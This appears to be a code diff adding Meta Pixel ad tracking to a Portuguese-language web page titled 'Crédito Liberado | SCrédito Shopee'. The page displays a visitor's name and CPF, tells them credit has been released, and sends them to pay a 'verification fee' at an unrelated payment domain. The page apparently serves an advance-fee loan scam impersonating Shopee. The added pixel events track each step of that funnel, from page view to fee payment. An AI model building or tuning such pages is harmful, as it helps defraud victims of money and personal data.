@@ -2,6 +2,24 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Crédito Liberado | SCrédito Shopee</title>
+
+<!-- Meta Pixel Code -->
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '913651397584478');
+  fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=913651397584478&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
  
   <script>
     localStorage.setItem("upsell", "up2");
@@ -620,6 +638,20 @@
 
     // Atualizar informações do usuário no header e no card
     document.addEventListener('DOMContentLoaded', function() {
+      // Função para disparar eventos do Facebook Pixel
+      function trackFacebookEvent(eventName, parameters = {}) {
+        if (typeof fbq !== 'undefined') {
+          fbq('track', eventName, parameters);
+          console.log(`Facebook Pixel - Evento ${eventName} enviado`);
+        }
+      }
+
+      // Disparar ViewContent quando a página carregar
+      trackFacebookEvent('ViewContent', {
+        content_type: 'page',
+        content_category: 'credito_liberado'
+      });
+
       // Garantir que os elementos existem antes de tentar atualizar
       const userDisplayName = document.getElementById("user-display-name");
       const userDisplayCpf = document.getElementById("user-display-cpf");
@@ -732,6 +764,14 @@
     }
 
     function iniciarTransferencia() {
+      // Disparar evento do Facebook Pixel
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'InitiateCheckout', {
+          content_type: 'service',
+          content_category: 'transferencia_credito'
+        });
+      }
+
       // Esconder card inicial
       document.getElementById("card").classList.remove("active");
       
@@ -777,6 +817,14 @@
     }
 
     function redirecionarParaPagamento() {
+      // Disparar evento do Facebook Pixel
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'Purchase', {
+          content_type: 'service',
+          content_category: 'taxa_verificacao'
+        });
+      }
+
       const urlBase = "https://pay.pagamentosfacilitadosoficial.shop/DYp0ZxVBYWkgmvX";
       
       // Criar novos parâmetros garantindo que todos os dados sejam passados
@@ -817,6 +865,44 @@
       
       window.location.href = finalUrl;
     }
+    
+    // Função para trackear eventos de Facebook Pixel
+    function trackFacebookPixelEvent(event, params = {}) {
+      if (typeof fbq !== 'undefined') {
+        fbq('track', event, params);
+      }
+    }
+    
+    // Disparar eventos ViewContent
+    document.addEventListener('DOMContentLoaded', function() {
+      // Evento ViewContent no carregamento da página
+      trackFacebookPixelEvent('ViewContent', {
+        content_type: 'credit_approved',
+        content_name: 'Crédito Liberado - Up1'
+      });
+      
+      // Trackear clique no botão "Receber meu crédito"
+      const btnReceber = document.querySelector('[onclick="iniciarTransferencia()"]');
+      if (btnReceber) {
+        btnReceber.addEventListener('click', function() {
+          trackFacebookPixelEvent('ViewContent', {
+            content_type: 'transfer_initiation',
+            content_name: 'Iniciar Transferência'
+          });
+        });
+      }
+      
+      // Trackear clique no botão "Pagar Taxa de Verificação"
+      const btnPagar = document.querySelector('[onclick="redirecionarParaPagamento()"]');
+      if (btnPagar) {
+        btnPagar.addEventListener('click', function() {
+          trackFacebookPixelEvent('ViewContent', {
+            content_type: 'verification_payment',
+            content_name: 'Taxa de Verificação'
+          });
+        });
+      }
+    });
   </script>
 
 
